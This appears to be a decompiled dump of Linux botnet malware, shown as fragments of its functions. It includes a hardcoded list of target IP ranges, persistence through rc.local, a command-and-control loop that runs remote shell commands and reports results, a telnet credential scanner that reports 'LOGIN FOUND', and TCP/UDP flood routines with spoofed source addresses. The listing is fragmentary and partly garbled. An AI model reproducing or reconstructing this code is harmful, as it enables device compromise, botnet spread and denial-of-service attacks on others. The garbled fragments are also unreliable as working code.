        szprintf(v164, (int32_t)"14.168.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.169.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.170.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.171.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.172.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.173.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.174.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.175.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.176.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.177.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.178.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.179.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.180.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.181.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.182.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.183.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.184.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.185.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.186.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.187.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.188.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.189.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.190.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.191.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"45.121.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"45.120.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"45.115.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"43.252.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"43.230.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"43.240.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"43.245.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"41.174.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"49.118.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"78.188.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"45.127.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.30.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.33.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"123.16.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"202.44.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"116.93.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"91.83.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"41.253.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"117.173.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.190.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"146.88.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"112.196.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.178.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"112.45.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"183.223.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"116.71.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.44.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"110.235.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"124.253.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"211.237.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"117.175.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"117.173.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"178.93.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"111.9.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"222.252.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.174.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"222.252.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.160.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.161.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.162.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.163.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.164.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.165.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.166.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.167.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.168.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.169.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"123.17.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"123.18.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"123.19.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"123.20.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"123.21.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"123.22.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"222.252.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"222.253.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"222.254.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"222.255.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"37.247.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"41.208.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"183.220.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"175.201.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.198.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"183.223.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"50.205.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"88.248.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"88.105.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"88.247.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"85.105.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"188.3.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.203.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.55.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.220.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"183.233.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.242.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.198.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.14.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.195.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.203.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.214.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.218.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.225.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.228.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.231.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.60.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.248.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.253.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.255.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.35.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.49.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.62.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"144.48.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"163.47.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"163.53.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"223.29.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"59.153.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.176.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.175.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.177.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.183.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"202.164.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"203.134.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"210.56.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"49.156.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"203.210.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"117.181.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"117.178.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"117.177.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"117.176.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"117.170.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"117.171.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"117.162.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"112.26.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"112.27.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"112.28.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"112.29.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"112.30.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"112.31.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"203.150.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
    return inet_addr(v164);
=================FUNCTION : main ===================
++++++++ FUNCTION START 18901
++++++++ FUNCTION END 19681
++++++++ FUNCTION LENGTH 780
    srand(v157 ^ __libc_getpid());
    init_rand(v158 ^ __libc_getpid());
    int32_t v159 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x11e40
        v160 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        getcwd(v173, 256);
            __GI_fclose((char *)v160);
            while (true) {
                    sprintf(v178, (int32_t)"\"%s%s\"\n", v173, v176 + len2, (int32_t)&v171, (int32_t)&v171);
                    while (true) {
                        while (true) {
                                fgets((int32_t)&v164, 1024, v160);
                                if (__GI_strcasecmp((char *)&v164, v178) == 0) {
                                __GI_fclose(v179);
                                int32_t v181 = __GI_fopen((int32_t)v161, (int32_t)&v180); // 0x11fc8
                                    __GI_fclose((char *)v181);
                                getOurIP();
                                v167 = __libc_fork();
                                    if (__libc_fork() == 0) {
                                        zprintf((int32_t)"fork failed\n");
                                    while (true) {
                                        if (initConnection() != 0) {
                                            while (true) {
                                                if (initConnection() == 0) {
                                            getBuild();
                                            __GI_inet_ntoa((int32_t *)v182);
                                            sockprintf(v162, (int32_t)"BUILD %s:%s");
                                            while (true) {
                                                while (true) {
                                                    if (recvLine(v162, (char *)&v165, 0x1000, v170) == -1) {
                                                    while (true) {
                                                                    if (__libc_waitpid(v190, 0, 1) >= 1) {
                                                                        while (true) {
                                                                                while (true) {
                                                                                        free();
                                                            if (strstr(v170, "PING") == v170) {
                                                                sockprintf(v162, (int32_t)"PONG");
                                                                if (strstr(v170, "DUP") == v170) {
                                                                    zprintf((int32_t)"PEACE OUT IMMA DUP\n");
                                                            while (true) {
                                                                if (initConnection() == 0) {
                                                            while (true) {
                                                            while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                                        while (true) {
                                                                                        processCmd(v217, &v177);
                                                                                    processCmd(v217, &v177);
                                                                                while (true) {
                                                                                    free();
                                                                                while (true) {
                                                        if (__libc_waitpid(v190, 0, 1) < 1) {
                                        getBuild();
                                        __GI_inet_ntoa((int32_t *)v182);
                                        sockprintf(v162, (int32_t)"BUILD %s:%s");
                                    __libc_waitpid(v167, (int32_t)&v163, 0);
                                    zprintf((int32_t)"fork failed\n");
                                while (true) {
                                    if (initConnection() == 0) {
        getOurIP();
        v167 = __libc_fork();
            if (__libc_fork() == 0) {
                zprintf((int32_t)"fork failed\n");
            while (true) {
                if (initConnection() == 0) {
            __libc_waitpid(v167, (int32_t)&v163, 0);
            zprintf((int32_t)"fork failed\n");
        while (true) {
            if (initConnection() == 0) {
    getOurIP();
    v167 = __libc_fork();
        if (__libc_fork() == 0) {
            zprintf((int32_t)"fork failed\n");
        while (true) {
            if (initConnection() == 0) {
        __libc_waitpid(v167, (int32_t)&v163, 0);
        zprintf((int32_t)"fork failed\n");
    while (true) {
        if (initConnection() == 0) {
    szprintf(v169, (int32_t)"%s 2>&1", v168, v169, (int32_t)&v171);
    int32_t v225 = fdpopen(v169, "r"); // 0x12708
    while (true) {
        if (fdgets(v169, 1024, v225, v169) == 0) {
            fdpclose(v225);
            sockprintf(v162, (int32_t)"%s");
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 64354
++++++++ FUNCTION END 65465
++++++++ FUNCTION LENGTH 1111
                        while (true) {
                            while (true) {
                                while (true) {
                                            int32_t v192 = inet_pton(10, (char *)v173, (int32_t)&v191); // 0x18fbc
                                                inet_addr(v173);
                                            int32_t v195 = socket(); // 0x1901c
                                                if (__libc_connect(v195, (struct sockaddr *)&v171, 28) < 0) {
                                                    __libc_send(v195, (int32_t *)v157, result2 + v185, 0);
                                                        int32_t v205 = __libc_recv(v195, (int32_t *)v157, 512, v203, (int32_t)&v204); // 0x190c0
                                                                                free();
                                                                                free();
                                                                            while (true) {
                                                                                    while (true) {
                                                                                                        __libc_close(v195);
                                                                                                            free();
                                                                                                        free();
                                                                                                                __libc_close(v195);
                                                                                                                    free();
                                                                                                                free();
                                                                                                            free();
                                                                                                            __libc_close(v195);
                                                                                                                free();
                                                                                                            free();
                                                                                                    __libc_close(v195);
                                                                                                        free();
                                                                                                    free();
                                                                                                free();
                                                                                                        free();
                                                                                            __libc_close(v195);
                                                                                                free();
                                                                                            free();
                                                                                        __libc_close(v195);
                                                                                            free();
                                                                                        free();
                                                                                    free();
                                                                                    free();
                                                                        free();
                                                                        free();
                                                                    free();
                                                                    free();
                                free();
                                free();
                    free();
                    free();
        free();
        free();
    free();
    free();
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 4223
++++++++ FUNCTION END 4691
++++++++ FUNCTION LENGTH 468
            v168 = __vfork();
                __libc_close(v165);
                __libc_close(v166);
                    __libc_close(v166);
                    __libc_close(v165);
                    __libc_close(v166);
                __libc_close(v165);
                    __libc_close(v165);
                __libc_close(v166);
        v167 = getdtablesize();
        v168 = __vfork();
            __libc_close(v165);
            __libc_close(v166);
                __libc_close(v166);
                __libc_close(v165);
                __libc_close(v166);
            __libc_close(v165);
                __libc_close(v165);
            __libc_close(v166);
        v168 = __vfork();
            __libc_close(v165);
            __libc_close(v166);
                __libc_close(v166);
                __libc_close(v165);
                __libc_close(v166);
            __libc_close(v165);
                __libc_close(v165);
            __libc_close(v166);
    v167 = getdtablesize();
    v168 = __vfork();
        __libc_close(v165);
        __libc_close(v166);
            __libc_close(v166);
            __libc_close(v165);
            __libc_close(v166);
        __libc_close(v165);
            __libc_close(v165);
        __libc_close(v166);
=================FUNCTION : _memcpy ===================
++++++++ FUNCTION START 60082
++++++++ FUNCTION END 62521
++++++++ FUNCTION LENGTH 2439
                            while (true) {
                        while (true) {
                        while (true) {
                        while (true) {
                            while (true) {
                            while (true) {
                            while (true) {
                        while (true) {
                            while (true) {
                                    while (true) {
                        while (true) {
                            while (true) {
                            while (true) {
                                        while (true) {
                    case -1: {
                            while (true) {
                    case -2: {
                            while (true) {
                            while (true) {
                                        while (true) {
                while (true) {
                            while (true) {
                                while (true) {
                            while (true) {
                                while (true) {
                                while (true) {
                                        while (true) {
                        case -1: {
                                while (true) {
                        case -2: {
                                while (true) {
                                while (true) {
                                        while (true) {
                    while (true) {
                            while (true) {
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 13502
++++++++ FUNCTION END 13936
++++++++ FUNCTION LENGTH 434
        rand_cmwc();
    int32_t result = getHost(a1, &v163); // 0xfbc0
    int32_t v164 = socket(); // 0xfbf8
        result2 = sockprintf(v165, (int32_t)"Failed opening raw socket.");
    if (__GI_setsockopt(v164, 0, 3, &v166, 4) < 0) {
        result2 = sockprintf(v165, (int32_t)"Failed setting raw headers mode.");
        int32_t v174 = GetRandomIP(v167); // 0xfd08
        *v173 = (char)rand_cmwc();
        int32_t v176 = rand_cmwc(); // 0xfd58
                while (true) {
                        if (__GI_strcoll(v196, (int32_t)"rst") == 0) {
                                    if (__GI_strcoll(v196, (int32_t)"psh") == 0) {
                                        sockprintf(v165, (int32_t)"Invalid flag \"%s\"");
                rand_cmwc();
                    v180 = rand_cmwc();
                *v188 = (char)(0x1000000 * tcpcsum(v171, v172, v172, v186) / 0x1000000);
                while (true) {
                    __libc_sendto(v164, (int32_t *)v171, v168, 0, (int32_t)&v191, (int32_t)&v191);
                    v183 = GetRandomIP(v167);
                    *(char *)(v171 + 4) = (char)rand_cmwc();
                    *v177 = rand_cmwc();
                    *v173 = (char)rand_cmwc();
                    *v188 = (char)(0x1000000 * tcpcsum(v171, v172, v172, 0) / 0x1000000);
        rand_cmwc();
            v180 = rand_cmwc();
        *v188 = (char)(0x1000000 * tcpcsum(v171, v172, v172, v186) / 0x1000000);
        while (true) {
            __libc_sendto(v164, (int32_t *)v171, v168, 0, (int32_t)&v191, (int32_t)&v191);
            v183 = GetRandomIP(v167);
            *(char *)(v171 + 4) = (char)rand_cmwc();
            *v177 = rand_cmwc();
            *v173 = (char)rand_cmwc();
            *v188 = (char)(0x1000000 * tcpcsum(v171, v172, v172, 0) / 0x1000000);
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 40586
++++++++ FUNCTION END 41124
++++++++ FUNCTION LENGTH 538
    int32_t v164 = __get_hosts_byname_r(v163, 2, (int32_t)a2, a3, a4, a5, a6); // 0x157ec
                                            if (inet_aton((char *)v163, a3) != 0) {
                                            __open_nameservers(0);
                                            v182 = __dns_lookup((char *)v163, 1, v168, (int32_t)&v167, (int32_t)&v169, v181);
                                                free();
                                                free();
                                            free();
                                                free();
                                                free();
                                                if (inet_aton((char *)v163, a3) != 0) {
                                                __open_nameservers(0);
                                                v182 = __dns_lookup((char *)v163, 1, v168, (int32_t)&v167, (int32_t)&v169, v181);
                                                    free();
                                                    free();
                                                free();
                                                    free();
                                                    free();
                            if (inet_aton((char *)v163, a3) != 0) {
                            __open_nameservers(0);
                            v182 = __dns_lookup((char *)v163, 1, v168, (int32_t)&v167, (int32_t)&v169, v181);
                                free();
                                free();
                            free();
                                free();
                                free();
                                if (inet_aton((char *)v163, a3) != 0) {
                                __open_nameservers(0);
                                v182 = __dns_lookup((char *)v163, 1, v168, (int32_t)&v167, (int32_t)&v169, v181);
                                    free();
                                    free();
                                free();
                                    free();
                                    free();
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 55836
++++++++ FUNCTION END 59548
++++++++ FUNCTION LENGTH 3712
                    while (true) {
                        while (true) {
                                    while (true) {
                                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                                                        while (true) {
                                                    while (true) {
            while (true) {
                while (true) {
        while (true) {
=================FUNCTION : prints ===================
++++++++ FUNCTION START 2372
++++++++ FUNCTION END 2964
++++++++ FUNCTION LENGTH 592
                while (true) {
                    printchar((int32_t *)a1, v168);
                        printchar((int32_t *)a1, v168);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v172);
                    printchar((int32_t *)a1, v168);
                printchar((int32_t *)a1, v168);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v172);
            printchar((int32_t *)a1, v168);
                while (true) {
                    printchar((int32_t *)a1, v168);
                        printchar((int32_t *)a1, v168);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v172);
                    printchar((int32_t *)a1, v168);
                printchar((int32_t *)a1, v168);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v172);
            printchar((int32_t *)a1, v168);
            while (true) {
                printchar((int32_t *)a1, v168);
                    printchar((int32_t *)a1, v168);
            printchar((int32_t *)a1, (int32_t)*a2);
                printchar((int32_t *)a1, (int32_t)*v172);
                printchar((int32_t *)a1, v168);
            printchar((int32_t *)a1, v168);
    printchar((int32_t *)a1, (int32_t)*a2);
        printchar((int32_t *)a1, (int32_t)*v172);
        printchar((int32_t *)a1, v168);
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 12173
++++++++ FUNCTION END 12912
++++++++ FUNCTION LENGTH 739
    int32_t v164 = v163 ^ rand_cmwc(); // 0xdecc
    srand(v164);
        while (true) {
        while (true) {
                case 0: {
                        GetRandomPublicIP(24, v167, v179, v181, v181);
                                    socket();
                                        if (__libc_connect(*v178, (struct sockaddr *)&v165, 16) == -1) {
                    socket();
                case 1: {
                    while (true) {
                        getsockopt();
                case 2: {
                case 3: {
                    if (__libc_send(*v196, (int32_t *)v197, len, 0x4000) < 0) {
                        if (__libc_send(*v196, (int32_t *)"\r\n", 2, 0x4000) < 0) {
                case 4: {
                case 5: {
                    if (__libc_send(*v201, (int32_t *)v202, len2, 0x4000) < 0) {
                        if (__libc_send(*v201, (int32_t *)"\r\n", 2, 0x4000) < 0) {
                case 6: {
                                    get_telstate_host(v172, v167, v173);
                                    sockprintf(v207, (int32_t)"LOGIN FOUND - %s:%s:%s");
                case 7: {
                    __libc_send(*v208, (int32_t *)"sh\r\n", 4, 0x4000);
                    __libc_send(*v208, (int32_t *)"shell\r\n", 7, 0x4000);
                    if (__libc_send(*v208, (int32_t *)str3, len3, 0x4000) < 0) {
    while (true) {
    while (true) {
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 13123
++++++++ FUNCTION END 13499
++++++++ FUNCTION LENGTH 376
        rand_cmwc();
    int32_t result = getHost(a1, &v165); // 0xf4a8
        int32_t v167 = socket(); // 0xf4f0
            result3 = sockprintf(v166, (int32_t)"Failed opening raw socket.");
                makeRandomStr(v168, a5);
                while (true) {
                    while (true) {
                        __libc_sendto(v167, (int32_t *)v168, a5, 0, (int32_t)&v164, 16);
                                rand_cmwc();
    int32_t v174 = socket(); // 0xf68c
        if (__GI_setsockopt(v174, 0, 3, &v175, 4) < 0) {
            result5 = sockprintf(v166, (int32_t)"Failed setting raw headers mode.");
                int32_t v177 = v176 ^ rand_cmwc(); // 0xf72c
                srand(v177);
                init_rand(random());
            int32_t v184 = GetRandomIP(v178); // 0xf7f4
            *v183 = (char)rand_cmwc();
                v186 = rand_cmwc();
            makeRandomStr(v182 + 28, a5);
            while (true) {
                while (true) {
                    __libc_sendto(v174, (int32_t *)v182, v179, 0, (int32_t)&v199, (int32_t)&v199);
                    *v183 = (char)rand_cmwc();
                        v200 = rand_cmwc();
                    *(char *)(v182 + 4) = (char)rand_cmwc();
                    int32_t v201 = GetRandomIP(v178); // 0xfa20
    result5 = sockprintf(v166, (int32_t)"Failed opening raw socket.");
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 71850
++++++++ FUNCTION END 72508
++++++++ FUNCTION LENGTH 658
            while (true) {
                if (fgets(v170, v174, v175) != 0) {
                    __GI_fclose((char *)v175);
                                v182 = __open_etc_hosts();
                                    while (true) {
